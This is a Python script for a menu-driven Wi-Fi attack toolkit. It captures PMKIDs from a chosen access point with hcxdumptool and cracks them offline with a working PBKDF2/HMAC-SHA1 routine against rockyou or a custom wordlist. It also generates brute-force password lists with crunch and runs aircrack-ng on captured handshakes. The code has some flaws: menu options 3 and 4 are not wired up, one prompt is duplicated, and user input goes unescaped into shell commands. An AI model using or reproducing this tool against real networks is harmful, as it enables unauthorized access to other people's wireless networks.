import os
import time
import subprocess
import hashlib
import hmac
from subprocess import check_call
from binascii import unhexlify

interface = None

def start():
    print("\nInstalling necessary Tools..")
    print("This may take a while, please be patient\n")
    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver -y")
    os.system("sleep 3 && clear")

def main():
    cmd = os.system("clear")
    print("""\033[1;92m
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░█░█░▀█▀░█▀▀░▀█▀░░░░░░░░░█▀█░█▀▀░█▀█░▀█▀░█▀▀░█▀▀░▀█▀░░░▀█▀░█▀█░█▀█░█░░
░█▄█░░█░░█▀▀░░█░░░░▄▄▄░░░█▀▀░█▀▀░█░█░░█░░█▀▀░▀▀█░░█░░░░░█░░█░█░█░█░█░░
░▀░▀░▀▀▀░▀░░░▀▀▀░░░░░░░░░▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀▀▀░░▀░░░░░▀░░▀▀▀░▀▀▀░▀░░
                                            
-------------------------------------------------------------------------  
[+] You may need external wifi adapter for some features
[+] Press CTRl + B to go back to main menu

(1)Networks attacks (Bssid,monitor mode needed)       
(2)Scan Networks
(3)Capturing Handshake(monitor mode needed)                    
(4)Crack Handshake (Handshake needed)               
(5)Create your own passwordlist

(00)Exit
----------------------------------------------------------------------- """)
    print("\n")
    number = input("[+] Enter the number : ")

    if number == "1":
        network_attacks()
    elif number == "2":
        show_networks()
    elif number == "5":
        create_passwordlist()
    elif number == "00":
        exit()
    else:
        print("Invalid number..")
        time.sleep(2)
        main()
    
def start_monitor_mode():
    global interface
    interface = input("\nEnter the interface (Default: wlan0): ").strip()
    if not interface:
        interface = "wlan0"
    subprocess.run("airmon-ng start " + interface, shell=True)
    subprocess.run("airmon-ng check kill", shell=True)

    print(f"\n{interface} set to monitor mode..")
    time.sleep(4)

def stop_monitor_mode():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return

    subprocess.run(["airmon-ng", "stop", interface])
    print(f"\nMonitor mode stopped on {interface}..")
    interface = None
    time.sleep(4)
    main()


def network_attacks():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()
    print("\n")
    print("1. PMKID Attack")
  
    print("\n")
    choice = input("[+] Enter the number : ").strip()
    if choice == "1":
        pmkid_attack()
    else:
        print("Invalid number..")
        network_attacks()


def show_networks():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return
    print("\n[+] Scanning for networks... Press CTRL+C to stop.\n")
    time.sleep(2)
    os.system(f"airodump-ng {interface}")


def python_crack_pmkid(hashfile: str, wordlist: str):
    """
    Crack a PMKID hash using pure Python.
    Format: <AP-MAC>*<STA-MAC>*<PMKID>*<SSID>
    """
    try:
        line = open(hashfile, "r", errors="ignore").readline().strip()
        ap_mac, sta_mac, pmkid_hex, ssid = line.split('*')
        ap_bytes = unhexlify(ap_mac.replace(':', ''))
        sta_bytes = unhexlify(sta_mac.replace(':', ''))
        pmkid_target = unhexlify(pmkid_hex)
    except Exception as e:
        print(f"[!] Error parsing PMKID hash: {e}")
        return None

    try:
        with open(wordlist, "r", errors="ignore") as f:
            for password in f:
                password = password.strip()
                # Derive PMK using PBKDF2-HMAC-SHA1
                pmk = hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
                # Compute HMAC-SHA1 over b"PMK Name" + AP_MAC + STA_MAC
                pmkid_calc = hmac.new(pmk, b"PMK Name" + ap_bytes + sta_bytes, hashlib.sha1).digest()[:16]
                if pmkid_calc == pmkid_target:
                    print(f"[+] Password found: {password}")
                    return password
    except FileNotFoundError:
        print("[!] Wordlist not found.")
        return None

    print("[-] Password not found in the wordlist.")
    return None

def pmkid_attack():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    show_networks()

    bssid = input("\nEnter the BSSID of the target AP : ").strip()
    channel = input("\nEnter Channel of the target AP : ").strip()
    subprocess.run(["iwconfig", interface, "channel", channel])

    print("\nStarting hcxdumptool to capture PMKID... Press CTRL+C to stop.")
    time.sleep(3)
    os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")

    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
    print(f"\nPMKID captured. Saved at {pmkid_path}\n")
    time.sleep(2)

    # Convert to 22000 format using hcxpcapngtool (still needed)
    print("[+] Converting pcapng to hash file...")
    subprocess.run(["hcxpcapngtool", "-o", "pmkid.22000", pmkid_path], check=True)
    hashfile = "pmkid.22000"

    # Choose wordlist
    print("\n[1] Crack PMKID using existing wordlist")
    print("[2] Crack PMKID using custom wordlist")
    choice = input("\n[+] Enter the number: ").strip()

    if choice == "1":
        wordlist = "./rockyou.txt"
        gz_path = "./rockyou.txt.gz"
        if not os.path.exists(wordlist):
            if os.path.exists(gz_path):
                print("[+] Extracting rockyou.txt.gz ...")
                os.system(f"gzip -d {gz_path}")
            else:
                print("[!] rockyou.txt or rockyou.txt.gz not found!")
                return
    elif choice == "2":
        wordlist = input("\nEnter the full path to the wordlist: ").strip()
        if not os.path.exists(wordlist):
            print("[!] Wordlist not found!")
            return
    else:
        print("[!] Invalid choice.")
        return

    print("\n[+] Cracking PMKID with Python...")
    result = python_crack_pmkid(hashfile, wordlist)
    if result:
        print(f"[✔] Success! Cracked password: {result}")
    else:
        print("[✘] Failed to crack the PMKID.")

    time.sleep(10)
    main()



def create_passwordlist():
    print("\n[+] Size of the file and time taken to create the password list depends on your input..")
    print("\n[+] Enter the characters to be included in the password list.")
    print("[+] Example: if you only want list include numbers enter : 0123456789")
    characters = input("\n[+] Enter the characters : ").strip()
    length = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    output = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    print("\nCreating password list... Please wait.")
    subprocess.run(f"crunch {length} {length} {characters} -o passwordlist.txt", shell=True)
    a = os.getcwd()
    print(f"\nPassword list created at {a}\n")
    time.sleep(5)
    choice = input("\nDo you want to crack handshake using this password list? (y/n) : ")
    if choice == "y":
        handshake_path = input("\n[+] Enter the path of the handshake file: ").strip()
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w passwordlist.txt")
    time.sleep(15)
    main()



start()
main()
